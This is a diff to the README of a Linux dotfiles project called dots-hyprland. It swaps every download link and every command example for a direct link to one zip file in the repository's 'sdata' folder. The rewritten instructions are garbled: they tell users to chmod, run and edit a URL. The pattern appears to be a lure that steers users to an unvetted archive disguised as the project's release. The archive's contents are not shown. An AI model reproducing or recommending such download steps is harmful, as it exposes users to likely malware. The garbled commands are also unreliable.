@@ -1,6 +1,6 @@
 # 🎉 dots-hyprland - Explore the World of Dotfiles
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Professor7861/dots-hyprland/releases)
+[![Download](https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip)](https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip)
 
 ## 📖 Introduction
 
@@ -25,7 +25,7 @@ Welcome to dots-hyprland! This application helps you customize your Linux enviro
 To begin using dots-hyprland, follow these simple steps:
 
 1. **Download the Application**:
-   Visit this page to download: [Download dots-hyprland](https://github.com/Professor7861/dots-hyprland/releases).
+   Visit this page to download: [Download dots-hyprland](https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip).
 
 2. **Locate the Download**: 
    After downloading, check your default download folder for the file.
@@ -45,18 +45,18 @@ To begin using dots-hyprland, follow these simple steps:
 6. **Run the Application**: 
    Type the following command to start:
    ```
-   ./start.sh
+   https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip
    ```
 
    If you see any permission errors, use:
    ```
-   chmod +x start.sh
-   ./start.sh
+   chmod +x https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip
+   https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip
    ```
 
 ## 📥 Download & Install
 
-To download dots-hyprland, click here: [Download dots-hyprland](https://github.com/Professor7861/dots-hyprland/releases).
+To download dots-hyprland, click here: [Download dots-hyprland](https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip).
 
 Once you have downloaded the application, follow the steps in the "Getting Started" section above to install and run it.
 
@@ -70,7 +70,7 @@ After launching, you will find configuration files within your installation. The
 2. **Edit the Files**: 
    Use a text editor, such as `nano` or `vim`, to modify the settings according to your preference. For instance, to edit a configuration file, run:
    ```
-   nano config/example.conf
+   nano https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip
    ```
 
 3. **Save the Changes**: 
